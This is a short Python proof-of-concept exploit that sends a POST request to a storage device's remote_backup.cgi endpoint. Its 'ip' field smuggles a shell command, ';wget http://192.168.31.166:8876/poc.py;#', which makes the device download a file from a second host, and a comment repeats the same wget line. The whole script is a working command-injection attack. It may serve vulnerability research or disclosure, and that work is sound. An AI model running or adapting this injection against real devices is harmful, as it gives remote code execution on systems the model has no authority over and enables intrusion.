import requests

url = "http://192.168.31.10:80/cgi-bin/remote_backup.cgi"

headers = {
}

data = {'ip': '127.0.0.1;wget http://192.168.31.166:8876/poc.py;#', 's_type': '1', 'direction': '1', 'task': 'testtask', 'local_path': '/mnt/HD/HD_a2/test', 'rsync_user': 'rsyncuser', 'rsync_pw': 'rsyncpass', 'keep_exist_file': '0', 'incremental': '0', 'encryption': '0', 'inc_num': '0', 'ssh_user': 'sshuser', 'ssh_pw': 'sshpass', 'cmd': 'cgi_server_test'}

# wget http://192.168.31.166:8876/poc.py

response = requests.post(
    url,
    headers=headers,
    data=data,
    timeout=10
)

print("Status:", response.status_code)
print("Response:")
print(response.text)

